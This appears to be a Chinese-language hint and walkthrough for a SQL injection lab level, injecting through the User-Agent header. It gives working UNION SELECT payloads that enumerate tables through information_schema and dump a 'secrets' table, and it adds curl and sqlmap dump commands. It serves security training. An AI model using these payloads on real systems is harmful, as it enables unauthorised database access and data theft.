思路提示

本关注入点在 HTTP 请求头 User-Agent 里：页面加载时会把当前 UA 拼进 SQL 并回显查询结果。用 Burp、curl 或浏览器插件改 UA 即可注入。核心思路：单引号闭合 → UNION SELECT 补齐 3 列 → 把要查的数据放到回显位。

详细解题过程（点击展开）
1. 引起报错（确认 UA 被拼进 SQL）：
User-Agent: '
刷新页面后出现 MySQL 语法错误，说明单引号未过滤。

2. 测字段数量：原查询 SELECT id, username, role FROM users WHERE username = '$ua' 共 3 列。
User-Agent: ' union select 1,1,1 -- -
结果表格里多出一行 1 | 1 | 1，说明 3 列对齐；加一列会报「列数不一致」。

3. 拿库名（定位回显位）：
User-Agent: ' union select 1,1,database() -- -
第三列显示 bafanglab —— 第 3 个字段就是回显位。

4. 拿表名：
User-Agent: ' union select 1,1,(select group_concat(table_name) from information_schema.tables where table_schema=database()) -- -
返回 users,comments,secrets。

5. 拿列名：
User-Agent: ' union select 1,1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='secrets') -- -
返回 id,secret,note。

6. 拿数据（通关凭证）：
User-Agent: ' union select 1,1,(select secret from secrets limit 0,1) -- -
第三列直接显示通关凭证。
注意：去掉 limit 0,1 会报 Subquery returns more than 1 row（secrets 表有多行）；用 limit 限定或 group_concat() 合并均可。

7. curl 命令行验证：
curl -H "User-Agent: ' union select 1,1,(select secret from secrets limit 0,1) -- -" {{SITE}}/modules/sqli/header.php

8. 其他请求头同样可试：把 payload 放到 X-Forwarded-For、Referer、Cookie 里，观察页面回显的「执行 SQL」与结果是否变化。

9. sqlmap 自动化（只跑 UNION 技术）：先把请求保存为 req.txt，再跑：
sqlmap -r req.txt -p User-Agent --technique=U -D bafanglab -T secrets --dump --batch
小提示：浏览器默认 UA 很长且含特殊字符，注入时建议用 Burp 或 curl 直接设置干净的 UA；请求头里 -- 后面的空格必须保留，可写成 --%20 或 -- -。
